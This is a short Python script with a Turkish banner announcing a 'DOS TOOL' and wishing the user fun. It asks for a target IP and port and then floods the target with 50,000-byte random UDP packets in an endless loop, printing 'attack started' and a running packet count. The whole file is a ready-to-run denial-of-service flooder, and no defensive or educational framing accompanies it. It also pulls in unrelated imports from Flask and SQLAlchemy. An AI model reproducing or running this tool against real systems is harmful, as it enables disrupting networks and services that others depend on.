import socket
import random
import os
from flask import got_request_exception

from sqlalchemy import true


os.system("clear")
banner="""
                               ################################
                               #      CODER BY W1SE           #
                               #                              #
                               #         DOS TOOL             #
                               #                              #
                               #                              #
                               #      İYİ EĞLENCELER          #
                               ################################

"""
print(banner)
hedef_ip=str(input("hedef ip: "))
hedef_port=int(input("hedef port: "))

bytes=random._urandom(50000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while true:
    sock.sendto(bytes,(hedef_ip,hedef_port))
    sayac=sayac+1
    print("saldiri baslatildi,gonderilen paket:%s"%(sayac))